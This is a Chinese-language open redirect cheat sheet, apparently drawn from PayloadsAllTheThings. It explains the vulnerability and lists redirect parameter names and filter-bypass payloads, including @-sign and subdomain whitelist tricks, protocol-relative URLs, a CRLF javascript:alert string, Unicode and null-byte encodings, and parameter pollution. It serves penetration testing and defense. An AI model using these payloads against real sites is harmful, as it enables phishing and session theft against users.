# Open Redirect - 开放重定向

[SEARCH_KEYWORDS]
漏洞类型: Open Redirect 开放重定向 URL Redirection
攻击类型: Phishing Session Theft Bypass Access Control
关键词: redirect url next return goto target destination location
状态码: 301 302 303 307 308
技术: Filter Bypass CRLF Unicode Domain Spoofing

[CONTENT]

## 开放重定向概述

开放重定向漏洞发生在Web应用程序或服务器使用未验证的用户输入将用户重定向到其他站点时。攻击者可以利用此漏洞构造指向恶意站点的链接。

## HTTP重定向状态码

| 状态码 | 含义 |
|--------|------|
| 301 | Moved Permanently (永久移动) |
| 302 | Found (临时移动) |
| 303 | See Other (查看其他) |
| 307 | Temporary Redirect (临时重定向) |
| 308 | Permanent Redirect (永久重定向) |

## 重定向方法

### 基于路径的重定向

```powershell
https://example.com/redirect/http://malicious.com
https://example.com/redirect/../http://malicious.com
```

### JavaScript重定向

```javascript
var redirectTo = "http://trusted.com";
window.location = redirectTo;
// Payload: ?redirectTo=http://malicious.com
```

### 常见参数名

```powershell
?url= ?redirect= ?next= ?return= ?returnTo=
?redir= ?goto= ?target= ?dest= ?destination=
?checkout_url= ?continue= ?go= ?image_url=
?redirect_uri= ?redirect_url= ?return_path=
```

## 过滤绕过

### 白名单域名绕过

```powershell
www.whitelisted.com.evil.com
whitelisted.com@evil.com
```

### 协议绕过

```powershell
//google.com
////google.com
https:google.com
\/\/google.com/
/\/google.com/
```

### CRLF绕过

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

### 编码绕过

```powershell
# Unicode点号绕过
google%E3%80%82com
/?redir=google。com

# NULL字节
//google%00.com
```

### HTTP参数污染

```powershell
?next=whitelisted.com&next=google.com
```

### @符号利用

```powershell
http://www.theirsite.com@yoursite.com/
//<user>:<password>@<host>:<port>/<url-path>
```

### 创建文件夹伪装

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

### ?符号利用

```powershell
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```

### Unicode规范化

```powershell
https://evil.c℀.example.com  # -> https://evil.ca/c.example.com
http://a.com／X.b.com
```

## 工具

- Open-Redirect-Payloads - Payload列表
- Open Redirect Cheat Sheet

## 参考文档

原始来源: PayloadsAllTheThings/Open Redirect/README.md